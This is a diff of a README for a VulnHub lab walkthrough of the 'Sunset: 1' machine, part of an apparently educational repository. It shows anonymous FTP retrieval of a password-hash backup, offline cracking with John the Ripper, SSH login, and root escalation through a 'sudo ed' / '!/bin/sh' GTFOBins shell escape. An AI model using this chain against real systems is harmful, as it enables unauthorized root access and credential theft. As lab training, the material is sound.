@@ -2,159 +2,253 @@
 
 ## Overview
 
-**Sunset: 1** is an Easy-level VulnHub machine that focuses on FTP enumeration, password hash extraction, offline password cracking, SSH access, Linux privilege escalation, and sudo misconfiguration abuse.
+**Sunset: 1** is an Easy-level VulnHub machine created by **whitecr0wz**. The challenge focuses on FTP enumeration, password hash extraction, offline password cracking, SSH authentication, and Linux privilege escalation through an insecure sudo configuration.
 
-The challenge demonstrates how anonymous FTP access combined with exposed credential backups and insecure sudo permissions can lead to complete system compromise.
+The machine demonstrates how anonymous FTP access combined with exposed credential backups and unsafe sudo permissions can lead to complete system compromise.
 
 ## Machine Information
 
-| Attribute   | Value                       |
-| ----------- | --------------------------- |
-| Platform    | VulnHub                     |
-| Machine     | Sunset: 1                   |
-| Author      | Whitecr0wz                  |
-| Difficulty  | Easy                        |
-| Target OS   | Debian Linux                |
-| Attacker OS | Kali Linux                  |
-| Objective   | Obtain User and Root Access |
+| Attribute | Value |
+|------------|---------|
+| Machine Name | Sunset: 1 |
+| Author | whitecr0wz |
+| Platform | VulnHub |
+| Difficulty | Easy |
+| Target OS | Debian Linux |
+| Attacker OS | Kali Linux |
+| Objective | Obtain User and Root Flags |
 
 ## Skills Demonstrated
 
-* Network Discovery
-* Service Enumeration
-* Nmap Scanning
-* FTP Enumeration
-* Anonymous FTP Assessment
-* Credential Discovery
-* Password Hash Analysis
-* Offline Password Cracking
-* John the Ripper
-* SSH Authentication
-* Linux Enumeration
-* Sudo Enumeration
-* GTFOBins Research
-* Linux Privilege Escalation
-* Post-Exploitation
+- Network Discovery
+- Service Enumeration
+- Nmap Scanning
+- FTP Enumeration
+- Anonymous FTP Access
+- Credential Harvesting
+- Password Hash Analysis
+- Offline Password Cracking
+- John the Ripper
+- SSH Authentication
+- Linux Enumeration
+- Sudo Enumeration
+- GTFOBins Exploitation
+- Linux Privilege Escalation
+- Post-Exploitation
 
 ## Tools Used
 
-* ARP-Scan
-* Nmap
-* FTP Client
-* John the Ripper
-* SSH
-* GTFOBins
-* Linux Enumeration Commands
-* Kali Linux
+- ARP-Scan
+- Nmap
+- FTP Client
+- John the Ripper
+- SSH
+- GTFOBins
+- Linux Enumeration Commands
+- Kali Linux
 
 ## Attack Methodology
 
 1. Discover the target machine on the network.
-2. Enumerate open ports and running services.
+2. Enumerate open ports and services.
 3. Identify anonymous FTP access.
 4. Download exposed backup files.
 5. Extract password hashes from the backup.
-6. Crack password hashes offline using John the Ripper.
-7. Obtain valid user credentials.
-8. Gain authenticated SSH access.
-9. Enumerate local system permissions.
-10. Review sudo privileges.
-11. Identify privilege escalation opportunities.
-12. Abuse a vulnerable sudo configuration.
-13. Escalate privileges to root.
-14. Validate compromise and retrieve flags.
+6. Crack the target user's password hash offline.
+7. Authenticate via SSH using recovered credentials.
+8. Obtain user-level access.
+9. Enumerate sudo permissions.
+10. Identify unsafe sudo configuration.
+11. Abuse GTFOBins technique using `ed`.
+12. Escalate privileges to root.
+13. Capture both user and root flags.
 
-## Key Learning Outcomes
+## Open Services Identified
 
-* Anonymous FTP access can expose sensitive information.
-* Backup files frequently contain valuable credentials.
-* Password hashes should be protected as sensitive data.
-* Weak passwords significantly increase security risk.
-* Offline password cracking remains highly effective against weak credentials.
-* Misconfigured sudo permissions can directly lead to root compromise.
-* Enumeration is one of the most important phases of penetration testing.
+| Port | Service |
+|--------|---------|
+| 21 | FTP (pyftpdlib 1.5.5) |
+| 22 | SSH (OpenSSH 7.9p1) |
+
+### Key Findings
+
+- Anonymous FTP login enabled.
+- Backup file exposed through FTP.
+- Password hashes stored in accessible backup.
+- SSH service available for remote access.
+- Unsafe sudo configuration allowing privilege escalation. 
 
 ## Vulnerabilities Identified
 
-* Anonymous FTP Access Enabled
-* Sensitive Backup File Exposure
-* Password Hash Disclosure
-* Weak Password Security
-* Credential Exposure
-* Insecure Access Controls
-* Excessive Sudo Permissions
-* Privilege Escalation via GTFOBins
+### 1. Anonymous FTP Access
 
-## Security Recommendations
+The FTP service allowed anonymous authentication:
 
-* Disable anonymous FTP access unless absolutely necessary.
-* Restrict access to backup files and sensitive data.
-* Enforce strong password policies.
-* Store password backups securely.
-* Implement multi-factor authentication for SSH.
-* Apply the Principle of Least Privilege.
-* Regularly audit sudo permissions.
-* Monitor FTP, SSH, and sudo activity for suspicious behavior.
-* Conduct routine vulnerability assessments and security reviews.
+```text
+Anonymous FTP login allowed
+```
 
-## Walkthrough
+This exposed sensitive files that should not have been publicly accessible. 
 
-📄 Detailed Proof of Concept (PoC) report available in:
+### 2. Credential Backup Exposure
 
-**Sunset_1_Walkthrough.pdf**
+A backup file was accessible through FTP and contained multiple SHA-512 password hashes resembling `/etc/shadow` entries.
 
-## Attack Chain Summary
+```text
+backup
+```
 
-* Network Discovery using ARP-Scan
-* Service Enumeration with Nmap
-* Anonymous FTP Access
-* Backup File Discovery
-* Password Hash Extraction
-* John the Ripper Password Cracking
-* SSH Login as sunset
-* Sudo Enumeration
-* GTFOBins Exploitation using ed
-* Root Privilege Escalation
-* Flag Retrieval
+The file included hashes for several users, including the target account. 
 
-## Highlights
+### 3. Weak Password Security
 
-### Enumeration Findings
+The recovered hash for user `sunset` was successfully cracked using John the Ripper, demonstrating weak password selection. 
 
-* FTP service exposed
-* Anonymous FTP login enabled
-* SSH service available
-* Backup file accessible through FTP
-* Multiple SHA-512 password hashes disclosed
+### 4. Dangerous Sudo Permissions
 
-### Initial Access
+The user account was allowed to execute:
 
-* Backup file downloaded from FTP.
-* Password hash extracted and cracked using John the Ripper.
-* SSH access obtained as user **sunset**.
-
-### Privilege Escalation
-
-The following sudo permission was discovered:
-
-```bash
+```text
 (root) NOPASSWD: /usr/bin/ed
 ```
 
-Using the GTFOBins technique:
+which can be abused through GTFOBins techniques to obtain a root shell. 
+
+## Service Enumeration
+
+### FTP Enumeration
+
+Connect anonymously:
+
+```bash
+ftp <target-ip>
+```
+
+Directory listing revealed:
+
+```text
+backup
+```
+
+The file contained password hashes for multiple users. 
+
+### SSH Enumeration
+
+Nmap identified:
+
+```text
+OpenSSH 7.9p1 Debian
+```
+
+SSH became the primary access vector after recovering valid credentials. 
+
+## Initial Access
+
+### Password Recovery
+
+Extract the target user's SHA-512 hash and crack it using John the Ripper:
+
+```bash
+john pass.txt
+```
+
+The password was recovered successfully and used for SSH authentication.
+
+### SSH Login
+
+```bash
+ssh sunset@<target-ip>
+```
+
+After authentication, user-level access was obtained and the user flag was retrieved.
+
+## Privilege Escalation
+
+Running:
+
+```bash
+sudo -l
+```
+
+revealed:
+
+```text
+(root) NOPASSWD: /usr/bin/ed
+```
+
+According to GTFOBins, `ed` can spawn a shell:
 
 ```bash
 sudo ed
 !/bin/sh
 ```
 
-resulted in a root shell.
+Executing the above command resulted in immediate root access. 
 
-## Disclaimer
+## Root Access
 
-This walkthrough was performed in a controlled lab environment using an intentionally vulnerable machine provided by VulnHub. The content is intended solely for educational purposes, cybersecurity training, and ethical hacking practice.
+Verify privileges:
+
+```bash
+whoami
+```
+
+Output:
+
+```text
+root
+```
+
+Navigate to the root directory and retrieve the flag:
+
+```bash
+cd /root
+cat flag.txt
+```
+
+Root compromise successfully achieved.
+
+## Attack Chain Summary
+
+- Network Discovery using ARP-Scan
+- Service Enumeration using Nmap
+- Anonymous FTP Access
+- Backup File Discovery
+- Password Hash Extraction
+- John the Ripper Password Cracking
+- SSH Login as sunset
+- Sudo Enumeration
+- GTFOBins ed Exploitation
+- Root Shell Access
+- Flag Retrieval
+
+## Security Recommendations
+
+- Disable anonymous FTP access.
+- Avoid storing credential backups in publicly accessible locations.
+- Use strong and unique passwords.
+- Protect password hashes as sensitive information.
+- Restrict SSH access to authorized users only.
+- Avoid granting sudo access to dangerous binaries.
+- Apply the Principle of Least Privilege.
+- Monitor FTP, SSH, and sudo activity.
+- Conduct regular security audits and vulnerability assessments.
+
+## Key Learning Outcomes
+
+- Anonymous FTP services can expose sensitive information.
+- Credential backups should be treated as highly sensitive assets.
+- Offline password cracking remains effective against weak passwords.
+- SSH security depends heavily on credential strength.
+- GTFOBins is a valuable resource for privilege escalation assessment.
+- Misconfigured sudo permissions frequently lead to full system compromise.
+- Thorough enumeration is often the key to successful penetration testing.
+
+## Conclusion
+
+Sunset: 1 is an excellent beginner-friendly VulnHub machine for learning FTP enumeration, credential harvesting, password cracking, SSH authentication, and Linux privilege escalation. By leveraging exposed password backups and abusing an unsafe sudo configuration, complete system compromise was achieved. 
 
 ---
 
-**Author:** Omkar Babaji Sawant
+**Author:** Omkar Babaji Sawant  
 **Repository:** VulnHub-Walkthroughs
